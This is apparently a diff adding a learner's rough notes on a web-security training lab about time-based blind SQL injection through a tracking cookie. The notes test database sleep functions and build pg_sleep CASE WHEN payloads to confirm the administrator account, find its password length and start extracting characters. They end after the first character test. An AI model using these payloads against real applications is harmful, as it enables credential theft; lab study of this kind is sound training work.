@@ -1,0 +1,40 @@
+Lab: Blind SQL injection with time delays and information retrieval
+
+ This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+
+TrackingId=AaR6mdqOea5HmzSt; session=IgIATf6dLPrk6BikLmB0q86BEeHKCfQl
+
+first lets try to sleep it
+
+Oracle 	dbms_pipe.receive_message(('a'),10) didnt ty
+Microsoft 	WAITFOR DELAY '0:0:10' didnt work
+PostgreSQL 	SELECT pg_sleep(10) work
+MySQL 	SELECT SLEEP(10)  didnt work
+
+Okay now, the atack
+
+'; SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END --
+
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END -- works
+
+'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users where username = 'administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --  exists
+
+Lets see the LENGTH
+
+'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users where username = 'administrator' AND LENGTH(password)>20)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --  sleep(0)
+
+19 sleep(10) then LENGTH = 20
+
+SUBSTRING
+
+'; SELECT CASE WHEN ((SELECT COUNT(username) FROM users where username = 'administrator' AND SUBSTRING(password, 1 , 1)= 'a')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --  
+
+1
+a 
